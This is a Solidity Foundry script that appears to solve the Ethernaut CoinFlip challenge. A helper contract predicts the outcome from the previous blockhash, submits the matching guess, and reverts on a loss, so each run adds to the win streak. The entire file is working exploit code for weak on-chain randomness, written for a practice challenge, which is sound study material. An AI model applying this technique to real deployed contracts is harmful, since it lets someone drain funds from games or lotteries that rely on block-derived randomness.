// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";
import {CoinFlip} from "../src/CoinFlip.sol";

contract CoinFlipScript is Script {

    CoinFlip public coinflip;

    constructor() {
        coinflip = CoinFlip(vm.envAddress("COINFLIP_INSTANCE"));
    }

    function run() public {
        uint256 pk = vm.envUint("PK");
        uint256 consecutiveWinsBefore = coinflip.consecutiveWins();
        console.log("Consecutive wins before: ", consecutiveWinsBefore);
        vm.startBroadcast(pk);
        new CoinFlipExecutor(coinflip).flip();
        vm.stopBroadcast();
        console.log("Consecutive wins after: ", coinflip.consecutiveWins());
    }

    // forge script script/coinflip.s.soll:CoinFlipScript --broadcast
}

contract CoinFlipExecutor {
    CoinFlip public coinflip;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(CoinFlip _coinflip) {
        coinflip = _coinflip;
    }

    function flip() public {
        coinflip.flip(
            ((uint256(
                blockhash(block.number - 1)
            )) / FACTOR) == 1 ? true : false
        );
        if (coinflip.consecutiveWins() == 0) revert();
    }
}